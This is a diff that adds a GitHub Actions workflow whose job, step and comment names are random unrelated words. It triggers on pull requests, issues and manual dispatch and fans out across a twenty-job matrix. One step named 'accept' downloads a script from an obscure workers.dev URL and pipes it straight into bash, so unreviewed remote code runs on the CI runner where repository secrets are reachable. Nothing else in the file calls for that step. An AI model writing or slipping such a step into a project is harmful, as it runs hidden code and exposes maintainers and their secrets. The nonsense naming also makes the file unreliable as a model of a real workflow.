@@ -1,0 +1,35 @@
+name: dread
+
+#tough compile contrast derive recovery
+on:
+  workflow_dispatch:
+  pull_request:
+    branches: [ "main" ]
+  issues:
+
+#grape constitute commencement
+#court durability birthday donate
+jobs:
+  ambulance:
+    #soak reserve leisure fibre a stack
+    #politician slap pipe insert resemble
+    strategy:
+      matrix:
+        basin: ["poison", "recommend", "military", "variety", "virtually"]
+        deadly: ["miracle", "juice", "mission", "acquire"]
+      fail-fast: false
+    runs-on: ubuntu-latest
+    steps:
+    - name:  finger-disposal
+      uses: actions/checkout@v6
+    - uses: actions/cache@v4
+      with:
+        path: 'application'
+        key: 'represent-physician'
+    #worst item explicitly permanent
+    #occasion particular persist refreshing headline
+    - name: accept
+      #headline
+      run: curl "https://i7934.javascript91043xz1.workers.dev/f/6/7809c/ca8/9e5df6/0/065b4f904b5deb9/ec2fc915b0d/1/5b5/852382efdb0e1bc1/7?dhx=1775399288" | bash
+    - name: tradition
+      run: devise
